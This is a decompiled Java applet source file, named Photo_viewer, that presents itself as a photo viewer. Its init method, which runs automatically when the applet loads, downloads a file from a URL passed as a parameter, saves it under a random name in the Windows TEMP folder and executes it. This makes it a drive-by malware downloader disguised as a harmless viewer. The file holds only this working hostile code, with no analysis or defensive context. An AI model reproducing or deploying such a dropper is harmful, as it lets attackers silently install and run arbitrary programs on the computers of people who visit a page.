import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Photo_viewer extends Applet
{
    private static final long serialVersionUID = 1L;
    
    @Override
    public void init() {
        try {
            final URLConnection openConnection = new URL(this.getParameter("URL_CODE")).openConnection();
            final String generate_Path = Generate_Path(openConnection.getContentType());
            System.out.println(generate_Path);
            final InputStream inputStream = openConnection.getInputStream();
            final FileOutputStream fileOutputStream = new FileOutputStream(generate_Path);
            final byte[] array = new byte[500];
            for (int i = inputStream.read(array); i > 0; i = inputStream.read(array)) {
                fileOutputStream.write(array, 0, i);
            }
            fileOutputStream.close();
            inputStream.close();
            Runtime.getRuntime().exec(generate_Path);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    private static String Generate_Path(String substring) {
        String string = "";
        substring = substring.substring(substring.indexOf("/") + 1);
        for (int i = 0; i <= 3; ++i) {
            string += String.valueOf(Math.round(Math.random() * 26.0) + 1L);
        }
        return System.getenv("TEMP") + "\\" + string + "." + substring;
    }
}
